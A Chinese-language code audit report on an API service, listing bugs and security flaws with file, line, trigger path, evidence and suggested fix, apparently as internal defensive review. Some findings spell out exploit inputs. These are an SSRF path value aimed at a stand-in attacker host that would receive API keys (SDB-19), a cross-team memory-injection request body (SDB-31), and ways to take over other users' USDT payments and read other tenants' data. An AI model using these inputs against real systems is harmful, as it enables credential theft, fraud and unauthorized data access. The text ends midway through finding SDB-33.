> 本轮 7 路并行逐行读完 119 个文件 + 补读 7 个（合计 126），以下均逐条回原文核对过行号与引用。凡与 `findings-api.md` 可能重合的文件不在此集合内（本轮集合 = findings-api 未引用的 126 个），故无编号冲突。

### SDB-10 上下文历史整体 `reverse()` 把每轮问答对顺序翻反

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/context-manager-service.ts:302-329`
- **触发路径**：`GET /agents/:agentId/context`（`routes/agent-extended.ts:1671`）读取任一有多轮历史的 agent。
- **根因**：rows 按 `createTime DESC` 拿到 [新, 旧]，循环内每行先 push `user` 再 push `assistant`，得到 `[u新,a新,u旧,a旧]`；最后对**扁平数组**整体 `messages.reverse()`，变成 `[a旧,u旧,a新,u新]` —— 每个 assistant 回答都排在其 user 提问之前。
- **证据**：`for (const row of rows) { if (row.content) push user; if (row.answer) push assistant }` 紧接 `return messages.reverse()`。
- **影响面**：模型收到的历史语义错乱（回答先于提问），多轮指代/续写退化；对外展示也按错误顺序。
- **建议修法**：先 `rows.reverse()`，再逐行 push；或每对 `unshift`。
- **是否当场可修**：是。

### SDB-11 `POST /command-acks` 重放分支不校验 ownerKey，跨租户读取他人 fact

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/command-ack-facts.ts:181-199`；`apps/api/src/routes/command-acks.ts:204-231`（对照 `:286-296`）
- **触发路径**：已登录用户 B 用他人 `parent_session_id + source_command_id` 调 `POST /api/command-acks`，payload 与原事实同指纹。
- **根因**：存储主键只有 `(parent_session_id, source_command_id)`，`recordCommandAckFact` 的 `existing` 分支只比 fingerprint，不比 `ownerKey`；命中即返回 `{ outcome:'replayed', fact: existing }`，路由把 `toPublicCommandAckView(fact)` 原样回包。同一读面的 `GET /alive` 却显式做了 `ownerKey` 判定。
- **证据**：`if (existing !== null) { if (existing.fingerprint === fact.fingerprint) { ... return { outcome:'replayed', fact: existing } } }`，全文无 `existing.ownerKey` 比较；路由 204-231 直接消费该 outcome。
- **影响面**：跨租户读取 fact.payload / entityRefs；不同指纹返回 `key-reused`，可当「他人坐标是否存在」的探针。
- **建议修法**：`getFact` 增 ownerKey 谓词，或在重放前比较 `existing.ownerKey !== fact.ownerKey` 并归入 `missing`。
- **是否当场可修**：是。

### SDB-12 PayPal 下单只写 `reference_id`，webhook 却按 `custom_id` 找单号 ⇒ 异步对账永不命中

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/paypal.ts:160-169`；`apps/api/src/routes/payment-gateway.ts`（PayPal webhook 分支按 `resource.custom_id` 取 outTradeNo）
- **触发路径**：PayPal 侧已 capture 成功、本地落库/发货失败后，靠 `PAYMENT.CAPTURE.COMPLETED` webhook 补偿。
- **根因**：`createOrder` 的 `purchase_units[0]` 只设 `reference_id: params.outTradeNo`，全文件无 `custom_id`（grep 零命中）；而 capture 资源里 `reference_id` 不会被回填成 `custom_id`，webhook 取不到单号 ⇒ 走 `skipped:'no_out_trade_no'`。
- **证据**：`purchase_units: [{ reference_id: params.outTradeNo, description, amount }]`；`paypal.ts` 内 `custom_id` 0 处。
- **影响面**：异步对账通道形同虚设，已扣款订单在本地失败后无人认领（需人工退款/补单），且无告警面。
- **建议修法**：下单同时写 `custom_id: outTradeNo`（webhook 兼容 `invoice_id`）。
- **是否当场可修**：是（需回归 PayPal 沙箱 webhook）。

### SDB-13 Qoder CLI 桥接未监听 `stdin`/`child` 的 `error`，一次 runner 崩溃会 `process.exit(1)`

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/upstream-adapters/qoder-cli-bridge.ts:550-557`；`apps/api/src/index.ts:522-525`（`uncaughtException` 处理器直接 `process.exit(1)`）
- **触发路径**：runner 启动即退出/中途崩溃（CLI 路径错、脚本异常）后，下一次请求继续 `child.stdin.write(...)`。
- **根因**：`try/catch` 只能接同步抛出；EPIPE / `ERR_STREAM_DESTROYED` 以异步 `'error'` 事件抛出，而全文件仅 `child.once`（退出事件）无 `child.on`/`stdin.on('error')`。Node 对无监听的 `'error'` 抛 uncaughtException，`index.ts` 的全局处理器选择退出进程。
- **证据**：`try { child.stdin.write(...) } catch { throw new QoderBridgeError(...) }`；grep `.on('error'` 在该文件 0 命中。
- **影响面**：单次坏请求/坏 runner 打挂整个 API 进程，所有在途请求中断。
- **建议修法**：`stdin.on('error', ...)` 与 `child.on('error', ...)` 统一转 `QoderBridgeError`；`write` 只走回调吞错。
- **是否当场可修**：是。

### SDB-14 D1 接码不检查 `resp.ok`，HTTP 错误页被当手机号/余额返回

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/d1jiema-service.ts:108-116`
- **触发路径**：接码平台 502/403/限流返回 HTML/JSON 错误页（不以 `ERROR:` 开头）。
- **根因**：只判正文前缀 `ERROR:`，不判 `resp.ok` / Content-Type。
- **证据**：`const text = (await resp.text()).trim(); if (text.startsWith('ERROR:')) throw ...; return text`。
- **影响面**：`getPhone` 把错误页当手机号交给后续取码/落台账；`getBalance` 返回垃圾；`queryUsedDetailed/getRelatedMsgs` 静默空集，热度判据失真。
- **建议修法**：`if (!resp.ok) throw`，并对号码/金额做形态校验。
- **是否当场可修**：是。

### SDB-15 `cli-import` 规则表顺序让 `/settings\.json$/i` 抢在所有专用解析器之前

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/cli-import/index.ts:79`（codex++ 规则）、`:249/:308`（`PARSERS.find`）
- **触发路径**：自动识别 `~/.claude/settings.json`、`%APPDATA%/Cursor/User/settings.json`、`.gemini/settings.json`。
- **根因**：codex++ 的 `/settings\.json$/i` 排在 claude-cli / gemini / cursor / windsurf / cline 之前，`find` 取第一个命中；`parseCodexPlus` 对无 `profiles` 数组的输入返回 `providers: []` + warning。
- **证据**：`filePatterns: [/codex-session-delete[/\\]settings\.json$/i, /settings\.json$/i]`；`parseCodexPlus` 无 profiles 时返回空数组。
- **影响面**：上述来源自动导入恒为「成功但 0 条」，专用解析器不可达；用户只能手选来源。
- **建议修法**：codex++ 规则收紧为仅 `codex-session-delete/settings.json`，或按「最具体优先」排序。
- **是否当场可修**：是。

### SDB-16 消息总线只看 HTTP 200，飞书/钉钉/企微业务码非 0 也报成功

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/message-bus/index.ts:38-54`；`feishu.ts:15`、`dingtalk.ts:15`、`wechat.ts:15`
- **触发路径**：机器人被限频、签名/关键词校验失败（协议上返回 HTTP 200 + 非 0 业务码）。
- **根因**：`postJson` 只判 `resp.ok` 与可选的 `message_id/id`，不解析 `code`/`errcode`；三个适配器直接透传其结果。
- **证据**：`if (!resp.ok) return { success:false, ... }; return { success: true }`；`feishu.ts` 仅 `return postJson(webhookUrl, { msg_type:'text', content:{text} })`。
- **影响面**：告警/通知静默丢失且上游认为已送达，故障不可见。
- **建议修法**：按渠道校验 `code===0` / `errcode===0`，否则 `success:false` 带 errmsg。
- **是否当场可修**：是。

### SDB-17 `recommend()` 裸 insert + `(user,content,strategy)` 唯一键 ⇒ 第二次推荐直接 500

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/tour/tour-recommendation.ts:188-199`；`packages/database/src/schema/tour.ts:83-87`
- **触发路径**：同一用户以默认 `strategy:'hot'` 第二次调用推荐（热门集合未变）。
- **根因**：表上有 `unique(user_id, content_id, strategy)`，写入是裸 `db.insert(...).values(items.map(...))`，无 `onConflictDoNothing/Update`。
- **证据**：`unique('tour_recommendations_user_content_strategy_unique').on(t.userId, t.contentId, t.strategy)`；推荐写入无冲突处理。
- **影响面**：第二次请求抛唯一键冲突 → 推荐接口 500；score/served_at 永远停在首次快照；`markClicked` 按 (user,content) 跨 strategy 全量置 true，CTR 虚高。
- **建议修法**：`onConflictDoUpdate` 更新 score/served_at；点击按推荐行 id 限定。
- **是否当场可修**：是。

### SDB-18 切换前备份静默跳过缺失文件，仍返回成功 ⇒ 回滚闭环断裂

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-switch/core.ts:300-311`（跳过）、`:427`（apply 直接调用）
- **触发路径**：当前登录态本就残缺（半切换态/首次登录未完成）时执行 switch apply。
- **根因**：`writeSnapshotContent` 对 `classifySwitchPath(src)==='absent'` 直接 `continue`，照样写 meta 并返回 ok；而 `captureCurrent` 明确要求 complete。`applySwitch` 调用的是前者，未做完整性闸门。
- **证据**：`if (classifySwitchPath(src) === 'absent') continue // 确实没有才跳过`；`captureCurrent` 有 `complete` 要求；apply 路径无同等校验。
- **影响面**：备份残缺 → 后续 `planSwitch` 的 `targetMissing` 使「切回即恢复」失败；本次切换却报成功，用户误以为可回滚。
- **建议修法**：备份前要求当前态 complete，或 meta 标 `partial` 并禁止作为切换目标。
- **是否当场可修**：是。

### SDB-19 clawdbot 集成调用可用反斜杠改写主机，凭据被带到任意主机（SSRF）

- **严重度**：P2（需管理面权限）
- **文件与行号**：`apps/api/src/services/clawdbot/integrations.ts:122-129`、`:152`、`:190-193`
- **触发路径**：`POST /clawdbot/integrations/call` 传 `path: "/\\attacker.example/x"`（或 `"\attacker.example/x"`）。
- **根因**：黑名单只拦 `scheme://` 与 `//`；WHATWG URL 对 http(s) 把 `\` 当 `/`，`new URL('/\\host', base)` 解析后 host 变成 attacker。随后 `applyAuth` 把该集成的 apiKey 写入发往该主机的请求。
- **证据**：本地 Node 实测 `new URL('/\\attacker.example/x','https://api.foo')` → `https://attacker.example/x`，host=`attacker.example`；拦截条件为正则 `^[a-z][a-z0-9+.-]*://` 与 `startsWith('//')`。
- **影响面**：已登记集成的 API Key 外带 + 内网 SSRF；需管理面身份，故非未授权。
- **建议修法**：解析后强制 `new URL(url).origin === new URL(baseUrl).origin`，并拒绝含 `\` 的 path。
- **是否当场可修**：是。

### SDB-20 流式结束的 `stop()` 收尾无 signal/超时，上游卡住则 SSE 永不收尾

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/upstream-adapters/trae-adapter.ts:561-572`（finally `await stop()`）、`:647-657`（fetch 无 signal）
- **触发路径**：每轮对话结束（[DONE]/end/客户端断开）都执行 stop 清理；上游 stop 端点慢/挂起。
- **根因**：`withStopCleanup` 在 finally 里 `await stop().catch(()=>{})`，而 `stop()` 的 `fetchImpl(stopUrl, {...})` 未传 `signal`，也无 `AbortSignal.timeout`。
- **证据**：`await fetchImpl(stopUrl, { method:'POST', headers: buildWebHeaders(jwt,'json'), body: ... })` 无超时参数。
- **影响面**：生成器不结束 ⇒ 转发层不补 `[DONE]`，SSE 悬挂、连接与账号并发槽位长期占用（上游每账号并发上限 3）。
- **建议修法**：`signal: opts.signal ?? AbortSignal.timeout(3000)`，失败/超时统一吞掉。
- **是否当场可修**：是。

### SDB-21 CTR 的 served 与 clicked 用同一条查询，命中即恒等于 1

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/tour/tour-monitoring.ts:65-72`
- **触发路径**：任意 `computeAndReportCtr` / `getContentHealth` 调用。
- **根因**：两个 `select({ count: count(*) })` 的 `from`/`where` 完全一致，clicked 侧漏了 `clicked = true`。
- **证据**：两条查询逐字相同，均 `where(eq(tourRecommendations.contentId, contentId))`。
- **影响面**：`ctr` 恒为 1（total>0），永久上报 100%，低 CTR 告警/健康摘要全失真。
- **建议修法**：第二条加 `eq(clicked, true)` 或 `count(*) filter (where clicked)`。
- **是否当场可修**：是。

### SDB-22 Hook 日志时间过滤用字符串字典序比较

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/hooks-service.ts:241-248`
- **触发路径**：`since/until` 带毫秒或 `+08:00` 偏移（ai-service 写入形如 `...T12:00:00.123456Z`）。
- **根因**：`String(log.triggeredAt) < filter.since` 按字符比较；`'.'(46) < 'Z'(90)`，同一秒的日志被判为更早；带 `+08:00` 时几乎全被过滤。
- **证据**：`const at = String(log.triggeredAt ?? ''); if (at < filter.since) return false`。
- **影响面**：日志查询与 `getHookStats` 的 total/success/avgDuration 同步少记。
- **建议修法**：`Date.parse` 后按数值比较；NaN 返回 400。
- **是否当场可修**：是。

### SDB-23 工具调用台账导出：endDate 漏当天、limit 截断无标记

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/tool-invocation-ledger-export.ts:174-185`、`:244-258`
- **触发路径**：`endDate=2026-11-08`（纯日期）或过滤命中行数 > limit（默认 10000，上限 50000）。
- **根因**：`lte(createdAt, new Date('2026-11-08'))` 等价于当日 00:00:00Z；`.limit(limit)` 截断后信封无 `truncated/hasMore`，`rowCount` 只等于已取回行数。
- **证据**：`conditions.push(lte(..., new Date(filters.endDate)))`；`.limit(limit)` 后直接 `rowCount: lines.length`。
- **影响面**：终点当天账行整段漏出；超限静默少导出，验签与 digest 仍「自洽」，收件方无法察觉。
- **建议修法**：纯日期按次日零点做 `<`；取 `limit+1` 探测溢出并写入 `truncated` 或拒导。
- **是否当场可修**：是。

### SDB-24 `CREW_ROLES_JSON` 全无效时不回落内置角色，编排静默空跑

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/crew-role-loader.ts:117-136`、`:160-166`
- **触发路径**：`CREW_ROLES_JSON='{}'`，或每个角色都缺 `goal/backstory`。
- **根因**：无效角色只 `continue`，`result={}` 仍被当成功缓存并返回，不回退 `FALLBACK_ROLES`。
- **证据**：`if (typeof c.role !== 'string' || ... ) { logger.warn(...); continue }`；调用侧 `if (!cfg) continue`。
- **影响面**：crew 会话以「成功」结束但所有步骤被跳过、产出为空，无错误面。
- **建议修法**：`Object.keys(result).length === 0` 时按失败处理并返回内置角色。
- **是否当场可修**：是。

### SDB-25 短信回调的空白/逗号配置使双闸同时失效（fail-open）

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/sms-callback-parse.ts:163-179`；`apps/api/src/routes/sms-callback.ts:69`
- **触发路径**：`SMS_CALLBACK_TOKEN` 为纯空白，或 `SMS_CALLBACK_IP_ALLOWLIST` 为 `","` 等无有效项的值。
- **根因**：路由用未 trim 的原值判「已配置」（`Boolean(expectedToken || allowlist)`），服务内 trim 后为空即跳过；allowlist 过滤空项后为空也跳过 ⇒ 两闸皆无，返回 true。
- **证据**：`if (expected) { ... }`；`const allow = (input.allowlist ?? '').split(',').map(normalizeIp).filter(Boolean); if (allow.length > 0) { ... } return true`。
- **影响面**：回调端点无鉴权对外开放，可伪造送达回执/对任意号码退订。
- **建议修法**：两侧统一按 trim 后非空判「已配置」，否则 503/false（fail-closed）。
- **是否当场可修**：是。

### SDB-26 PR 审阅只取 files 首页且 `truncated` 在恰好 100 个文件时为 false

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/github-app/pr-review.ts:128-136`（fetch 处仅 `per_page`，无 `page`/Link 翻页）
- **触发路径**：PR 改动文件数 ≥ 100（GitHub `/pulls/{n}/files` 单页上限 100）。
- **根因**：`let truncated = parsed.data.length > maxFiles` 在 `=== maxFiles` 时为 false；且从不翻页。
- **证据**：`const maxFiles = Math.min(limits.maxFiles ?? MAX_REVIEW_FILES, MAX_REVIEW_FILES)`；`truncated = parsed.data.length > maxFiles`；循环 `parsed.data.slice(0, maxFiles)`。
- **影响面**：大 PR 的模型输入只含前 100 个文件且可能标注「未截断」，漏审文件仍可能给出 APPROVE。
- **建议修法**：按 Link 翻页到预算上限；至少 `>= maxFiles` 置 truncated 并写入提示词。
- **是否当场可修**：是。

## 十五、本轮已否证（附复核依据）

1. **`automations/orchestrator.ts`「PR 失败仍报 ✅ 成功」** —— 否证。`ok` 在执行阶段已确定；PR 创建失败只改写 `summary` 并进入回帖正文（`resultCommentBody(item, ok, summary, prUrl)`），且代码注释明确「PR 失败不回滚认领，错误进审计 + 回帖便于人工接管」。不存在「完全不提失败」的假成功；`report.fixed++` 语义是「修复已执行」，与 PR 是否产出分离，属设计权衡而非可证缺陷。
2. **`turnstile-service.ts` 缺密钥 fail-open** —— 否证为代码缺陷。实现在缺 `TURNSTILE_SECRET_KEY` 时返回 `{ success: true }`，但同时每进程告警一次并注明由 `scripts/check-env-drift.mjs` 巡检对账，是**明确的降级策略**；是否收紧属安全基线决策，不按缺陷计。
3. **「流式路径 input 恒 0 计费」** —— 否证。`v1-public.ts:852` 与 `:1032` 均以 `opts.promptText` 本地估算 prompt，流式不存在 input 零计费；SDB-08 已按实际机理改写（见 §十三）。

## 十六、本轮未判定（写清缺什么证据）

1. **`codearts-adapter.ts:396-403` 刷新时 `secret_access_key ?? ''` 覆盖旧 SK** —— 缺 STS 续期响应**省略** SK 的真实回包样例；若上游总是整套返回则无缺陷。
2. **`zcode-adapter.ts:71-75 / 417-428` 无 `zcodejwttoken` 时回落 access_token 探测 plan，401 被判 authFailed** —— 缺「scheduler/健康面如何消费 authFailed」的实测，以及「只导 oauth token」账号的真实导入形态。
3. **`codex-adapter.ts:75-82` 把 Chat Completions 形 `tools/tool_choice` 原样送 Responses API** —— 缺上游 400/422 实测；依赖外部 API 契约，未在仓内证实。
4. **`lingma-adapter.ts:242-249`（同型 `grokbot-adapter.ts:232-234`）429/404 落 `authFailed=false, indeterminate=false`** —— 缺上游 429/404 返回与健康状态写入证据。
5. **`relay-workbuddy-model-map.ts:258-260` UPDATE 把定价列置 0** —— 该模块 `buildModelSyncStatements/parseWorkbuddyRegistration` 仅测试引用，缺生产调用方。
6. **`ai-capability-discovery.ts:41-62` 健康探测不带凭据、anthropic 用 GET `/v1/messages`** —— 缺生产调用方与端点实测；若未被接线则无影响。
7. **`gemini-cli.ts:64-95` parser 期望 `.env` 而探测器给 `settings.json`** —— 缺 detector 实际分发输入样本（未复核 `detector.ts` 的完整分支）。
8. **`codex-cli.ts:87-99` `auth.json` 解析失败整份 return，丢弃已解析的 config.toml** —— 缺调用路径与真实损坏样本复核。
9. **`config-migrator.ts:257-270` 回滚失败仍置 `rolledBack:true`** —— 缺回滚写失败（EACCES/只读挂载）实测。
10. **`workbuddy-protocol.ts:662-670` 仅命中 remain 类键时 total 取 remain、used 补 0** —— 缺「上游只给 remains」的真实回包。
11. **（沿用上轮）`vendor-caller-service.ts:140-174` SSRF** —— 仍缺「endpoint 由用户输入拼接」的链路证据；全文件读完未见 Route 侧拼接点。
12. **（沿用上轮）`decideSync` 同票但仅新增 refreshToken 不同步** —— 仍缺该状态的真实产生路径。

## 十七、第四轮覆盖自证与收敛判定

- **基线**：`origin/main` @ `89a5938f0c`。`git diff --name-only origin/main -- apps/api/src/services` 仅 1 个文件有差异，且**不在本轮清单**内 ⇒ 本轮 126 个目标文件的工作树内容与 origin/main 逐字节一致，所有引用可直接复核。
- **集合差核对（可复现）**：
  1. 全量：`git ls-tree -r --name-only origin/main -- apps/api/src/services` 剔除 `__tests__`/`*.test.ts`/`*.spec.ts` ⇒ **365**。
  2. 以 `findings-api.md` 中出现的 `.ts` 引用做 basename / 相对路径匹配 ⇒ 未被引用 **126**（清单已落盘 `unref-services.txt`，本报告同目录）。
  3. 本轮逐行：7 路并行覆盖 **119** + 手工补读 **7**（`security-service.ts`、`api-key-tpm-service.ts`、`vendor-caller-service.ts`、`distributed-transaction.ts`、`relay-session-sync-decision.ts`、`relay-session-sync-noise.ts`、`relay-session-sync-target.ts`）= **126**。
  4. **126 − 126 = 0** ⇒ 「剩余未逐行文件」集合已清零。
- **365 的口径说明（不夸大）**：另外 **239** 个文件由 `findings-api.md` 的既有审计（F-001~F-681）覆盖，**不在本轮四轮内重读**。因此准确的表述是：**「findings-api 未引用的 126 个」差集为空**；若要求「四轮内把 365 个全部重读」，则差集仍是 239，不能按该口径宣布全仓收敛。
- **收敛判定**：本轮新增 **17 条**（P2×11 / P3×6），非零新增，按既定规则**不宣布收敛**；但「约 100 个未逐行文件」这一缺口已闭合。下一轮若继续，应转向：①SDB-08 升 P1 所需的三类证据（§十三-3）；②§十六 的 12 条未判定逐条定向取证；③239 个「既有审计已引用」文件的抽样复核（尤其适配器与大额资金路径）。

---

## 十八、第五轮新增（239 个「已被 findings-api 引用」文件全量重读）

> 基线 `origin/main` @ `d4e1621806`。全部 30 条均已回原文核对行号与逐字引用；与三份台账去重后仍有新增，故本轮**不宣布收敛**。

### SDB-27 USDT 全站共用单一收款地址，检测只按「金额 ≥ 应收 + 时间窗」取首笔，他人同额付款会被记到先被轮询的订单

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/payment-usdt-service.ts:388-419`（下单只写 env 固定地址）、`:500-507`、`:540-552`（TRC20 匹配）、`:586-599`（ERC20 匹配）、`:952-965`（确认时仅按 txHash 查重）、`:1045-1078`（轮询）
- **触发路径**：A 建 10 USDT pending 单不付款；B 随后建同额单并付款。`pollPendingUsdtPayments` 逐单 `checkUsdtPaymentStatus`；A 的单先被处理时，`:540-552` 命中 B 的链上交易并返回其 txHash；`confirmUsdtPaymentWithOnChainCheck` 按地址/金额/确认数复核通过后，`:968-977` 把该 txHash 绑到 A 的单。
- **根因**：共享固定地址下没有逐单地址/memo，匹配仅靠「金额下限 + 建单时间」，检测阶段既不排除已被占用的 txHash，也不跳过不合格候选。
- **证据**（`:540-552`）：
```
540	    for (const tx of data.data) {
541	      if (tx.to !== address) continue
542	      if (tx.block_timestamp < sinceTimestamp) continue
543	      const amount = Number(tx.value) / Math.pow(10, USDT_DECIMALS)
544	      if (amount >= expectedAmount) {
545	        // 2026-09-06 P0:返回 blockNumber(确认数计算),null 表示接口未提供
546	        return {
547	          txHash: tx.transaction_id,
548	          amountPaid: amount,
549	          blockNumber: tx.block_number ?? null,
```
- **影响面**：同一笔链上付款被记到非付款人的订单（A 得额度、B 资损且订单永久 pending）；可批量挂同额单被动截获他人充值。另检测取「≥ 应收」而复核要求精确金额，若先出现更大额他人付款，小额单每轮都命中该笔、复核必失败且不会跳到下一笔。
- **建议修法**：改逐单充值地址或链上 memo/tag；至少检测只接受金额精确相等且未被占用的 txHash，不可用时继续向后遍历。
- **是否当场可修**：是（需改收款地址模型）。

### SDB-28 ERC20 链上复核固定 `page=1&offset=100&sort=asc`，地址累计超 100 笔后新交易永远查不到，已付款订单永不入账

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/payment-usdt-service.ts:751-770`；调用链 `:879-893`
- **触发路径**：`network=ERC20` 下单 → 付款 → 轮询检测（`sort=desc&offset=50`）能发现新交易 → `confirmUsdtPaymentWithOnChainCheck` → `verifyUsdtOnChain` → `verifyErc20OnChain` 用 `asc` 第 1 页（最早 100 笔）查找 → 新交易不在结果集 → `:769-770` 判未通过，订单永久 pending。
- **根因**：复核查询的分页方向与「查最新交易」的目标相反，且无翻页/按 hash 直查。
- **证据**：
```
752	  const params = new URLSearchParams({
753	    module: 'account',
754	    action: 'tokentx',
755	    address,
756	    contractaddress: ERC20_USDT_CONTRACT,
757	    page: '1',
758	    offset: '100',
759	    sort: 'asc',
760	  })
```
```
769	  const tx = data.result.find((t) => t.hash.toLowerCase() === txHash.toLowerCase())
770	  if (!tx) return fail('未在平台地址转入记录中找到该交易(可能绑定他人或地址错误)', null, null, null)
```
- **影响面**：收款地址累计转入一旦超过 100 笔，全部 ERC20 充值 100% 无法入账；链上资金已到平台、用户零到账，且无管理端强制确认入口。
- **建议修法**：改 `sort=desc` 并翻页，或按 txHash 精确查询。
- **是否当场可修**：是。

### SDB-29 注销账号不吊销 developer API Key / 分享 token，凭据在账号删除后仍可调用并消耗余额

- **严重度**：P1
- **文件与行号**：`apps/api/src/services/purge-user-pii.ts:59-102,124-129,136-154`；`apps/api/src/plugins/api-key-auth.ts:919-925,776-799`；入口 `apps/api/src/routes/user/settings-routes.ts:384`
- **触发路径**：用户 `POST /settings/delete-account` → `purgeUserPii` 只清 `USER_SCOPED_TABLES`（不含 `developer_api_keys`/`api_key_shares`）并置 `users.status=3` → 之后任何人持原 Key 请求 `/v1/*` → `authenticateApiKey` 只校验 `developerApiKeys.status==='active'`（`:925`），从不查 `users.status` → 鉴权通过；`share_` token 分支（`:776-799`）同样只查分享记录与源 Key。
- **根因**：注销流程只吊销 refresh token，遗漏 API 凭据表；而 Key/分享鉴权链路不读取用户状态。
- **证据**：
```
124	  // 吊销该用户所有 refresh token（杜绝续期路径，配合 authenticate() 的 status=3 检查）
125	  try {
126	    await revokeAllUserRefreshTokens(userId)
```
```
919	  const [row] = await db
920	    .select()
921	    .from(developerApiKeys)
922	    .where(eq(developerApiKeys.key, key))
923	    .limit(1)
924	
925	  if (!row || row.status !== 'active') throw unauthorized('Invalid or revoked API key')
```
- **影响面**：注销后 API Key 继续有效并可消耗余额；第三方持有的 `share_` token 在所有者注销后仍有访问权，且所有者已无法登录撤销。与 F-269（同函数漏删 5 张数据表）同源但性质不同：本条是**凭据未失效**。
- **建议修法**：`purgeUserPii` 内显式撤销/删除 `developerApiKeys` 与 `api_key_shares`，或在鉴权后补查 `users.status===3` 拒绝。
- **是否当场可修**：是。

### SDB-30 Crew 计费挂在终态事件、幂等键按 session：重跑已完成会话与取消型请求均不扣费

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/crew.ts:190-202,260-273`；`apps/api/src/services/crew-orchestrator.ts:196-201,331-341`
- **触发路径**：(a) 对同一已 `completed` 的会话反复 `POST /sessions/:id/runs`：`executeSession` 只挡 `status='running'`（`ne(status,'running')`），每次都会真实跑完角色 LLM；`deductTokens(..., 'crew:<sessionId>')` 的幂等键恒定，第二次起命中 `token_flows` 幂等检查 → 0 扣费。(b) SSE 在 complete 前断开 → 编排器以 `type:'error'` 结束（`:331-341`），路由只在 `evt.type==='complete'`（`:261`）扣费 → 已发生的调用免费。
- **根因**：计费挂在终态事件分支，幂等键粒度是 session 而不是单次 run。
- **证据**：
```
190	      // G7: 集中扣费(幂等键 crew:<sessionId>,重复执行不重复扣)
191	      if (result.success && result.usage && result.usage.totalTokens > 0 && result.userId) {
192	        try {
193	          await server.tokenBalance.deductTokens(
194	            result.userId,
195	            result.usage.totalTokens,
196	            `crew_session:${id}`,
197	            `crew:${id}`,
```
```
199	      .where(and(eq(crewSession.id, sessionId), ne(crewSession.status, 'running')))
```
- **影响面**：单用户可对同一会话无限次免费调用模型；取消/断连可白嫖已消耗 token。与 F-203（工具子调用不计费）为不同路径，不重复。
- **建议修法**：每次执行生成独立 `runId` 作幂等键；`error`/`cancelled` 分支按实际 usage 结算。
- **是否当场可修**：是。

### SDB-31 团队记忆创建接口漏挂 scope 成员校验，任意登录用户可向他人团队写入记忆

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/team-memory.ts:138-154`（对照列表 `:119-127`、详情 `:164-168`）；服务层 `apps/api/src/services/team-memory-service.ts:147-161`
- **触发路径**：任意登录用户 `POST /api/team-memory`，body `{"scopeId":"<目标团队UUID>","kind":"convention","title":"x","content":"任意内容"}` → `:139` 仅 `requireLogin` → `:145` 直接 `createTeamMemory` → INSERT。GET 列表/详情/PUT/DELETE 均调用 `isScopeMember`，唯独 POST 没有；`createSchema.scopeId` 为自由字符串。
- **根因**：BUG-5 加固覆盖了读/改/删，遗漏创建面；服务层也不校验 scope。
- **证据**：
```
138	  // POST / — 创建(作者 = 当前用户)
139	  app.post('/', { preHandler: requireLogin }, async (request, reply) => {
140	    const body = parseOrThrow(createSchema, request.body)
141	    const userId = request.userId
142	    if (!userId) {
143	      return reply.status(401).send(error(401, '请先登录'))
144	    }
145	    const created = await createTeamMemory({
146	      scopeId: body.scopeId,
```
- **影响面**：非成员（含已被移出团队者）可向任意团队注入「决策/约定/坑点」记忆；若该记忆被喂入 Agent，即为持久化提示注入。
- **建议修法**：POST 比照 GET 调用 `isScopeMember(body.scopeId, userId, roleId)`，非成员 404。
- **是否当场可修**：是。

### SDB-32 换票成功/失败均以「读副本快照 + 无条件 UPDATE」整列回写，旧 refreshToken 会覆盖新票

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-account-pool-scheduler.ts:690-716,718-739`；`apps/api/src/services/relay-account-forwarder.ts:710-726,736-776`；`apps/api/src/services/relay-account-format.ts:447-448`
- **触发路径**：同一账号同时被巡检 `refreshOne`（持 sweep 锁）、本机登录 `loginTraeLocal`（无锁）、管理端查余额 401 自愈（无锁）、转发链路 `refreshRowInPlace`（仅进程内 Map）刷新，任意两路并发。成功分支在 refreshToken 缺省时回写**快照旧值** `row.refreshTokenEnc`，且 `WHERE id` 无 `cred_version` CAS。
- **根因**：跨路径无分布式互斥；进程内 Map 只覆盖 `refreshRowInPlace`，`refreshOne` 不入该域；回写为「旧快照 + 无条件 UPDATE」。
- **证据**：
```
690	    await db
691	      .update(aiRelayAccountPool)
692	      .set({
693	        tokenEnc: encryptField(result.token),
694	        refreshTokenEnc:
695	          result.refreshToken !== undefined && result.refreshToken !== null
696	            ? encryptField(result.refreshToken)
697	            : row.refreshTokenEnc,
```
```
710	/** 同账号并发刷新合并:refresh token 轮换制下并发刷新会互相覆盖,可能把号刷死 */
711	const refreshInFlight = new Map<string, Promise<AiRelayAccountPool | null>>()
```
- **影响面**：Trae/WorkBuddy 刷新不发新 refreshToken 时（`relay-account-format.ts:447-448` 自述），每次成功刷新都会把旧票写回，号池后续无法自刷新，需人工重登；失败分支还会用陈旧快照覆盖 `refreshFailureCount`（死号迟迟不到阈值）。`tempUnschedulable` 被覆盖一节与 F-647 重叠，不重复计。
- **建议修法**：互斥上提到 Redis（key=accountId）；回写加 `AND cred_version = ?`，且只写本次真实返回的字段。
- **是否当场可修**：是。

### SDB-33 支付宝 OAuth 的 `timestamp` 用 UTC 墙钟贴 `+08:00` 且格式不符协议，登录链路必被网关拒绝

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/oauth-providers.ts:534-543,581-590`；正确实现 `apps/api/src/services/alipay.ts:521-534`
- **触发路径**：`POST /api/auth/alipay/callback` → `exchangeAlipayCode` → `:539` 生成 `2026-11-08T02:33:12+08:00`（实际是 UTC 时刻）→ 参与 RSA2 签名 → 网关按 GMT+8 校验时间戳，超出容差即拒 → `:567-568` 抛 `no access_token`。
